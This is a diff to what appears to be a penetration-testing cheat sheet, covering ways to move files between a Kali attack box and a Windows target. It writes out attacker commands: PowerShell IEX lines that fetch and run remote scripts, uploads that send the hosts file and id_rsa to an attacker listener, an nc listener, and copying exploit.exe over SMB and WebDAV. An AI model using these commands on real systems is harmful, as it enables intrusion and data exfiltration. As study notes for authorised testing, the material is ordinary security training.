@@ -743,7 +743,7 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 #7. - File Transfers
 -----------------------------------------
 
-- Base64 (Kali -> Windows)
+- Base64 Downloads (Kali -> Windows)
 
 ```
 $ md5sum id_rsa
@@ -752,7 +752,7 @@ PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64
 PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ```
 
-- Base64 (Windows -> Kali)
+- Base64 Uploads (Windows -> Kali)
 
 ```
 PS C:\> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
@@ -787,41 +787,42 @@ PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://<IP address>:8000/
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 ```
 
-- PowerShell Web Uploads
+- PowerShell Web Uploads (Windows -> Kali)
 
 ```
 $ pip3 install uploadserver
 $ python3 -m uploadserver
-PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-PS C:\> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\> Invoke-FileUpload -Uri http://<IP address>/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
 
-- PowerShell Base64 Web Uploads
+- PowerShell Base64 Web Uploads (Windows -> Kali)
 
 ```
 PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-PS C:\> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64s
-$ nc -lvnp 8000
+PS C:\> Invoke-WebRequest -Uri http://<IP address>:8000/ -Method POST -Body $b64s
+$ nc -nlvp 8000
 $ echo <base64> | base64 -d -w 0 > hosts
 ```
 
-- SMB
+- SMB Downloads (Kali -> Windows)
 
 ```
 $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 C:\> net use n: \\<IP address>\smbshare /user:test test
+C:\> copy n:\exploit.exe
 ```
 
-- SMB Uploads WebDav
+- SMB Uploads WebDav (Windows -> Kali)
 
 ```
 $ sudo pip3 install wsgidav cheroot
 $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
-C:\> dir \\192.168.49.128\DavWWWRoot
-C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\> dir \\<IP address>\DavWWWRoot
+C:\> copy C:\Users\Public\Downloads\exploit.exe \\<IP address>\DavWWWRoot\
 ```
 
-- FTP
+- FTP Downloads (Kali -> Windows)
 
 ```
 $ sudo pip3 install pyftpdlib
@@ -829,14 +830,14 @@ $ sudo python3 -m pyftpdlib --port 21
 PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://<IP address>/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
 
-- FTP Uploads
+- FTP Uploads (Windows -> Kali)
 
 ```
 $ sudo python3 -m pyftpdlib --port 21 --write
-PS C:\> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+PS C:\> (New-Object Net.WebClient).UploadFile('ftp://<IP address>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
-- FTP Non-Interactively
+- FTP Downloads Non-Interactively (Kali -> Windows)
 
 ```
 C:\> echo open 192.168.49.128 > ftpcommand.txt
@@ -856,7 +857,7 @@ C:\>cat file.txt
 This is a test file
 ```
 
-- FTP Uploads Non-Interactively
+- FTP Uploads Non-Interactively (Windows -> Kali)
 
 ```
 C:\> echo open 192.168.49.128 > ftpcommand.txt
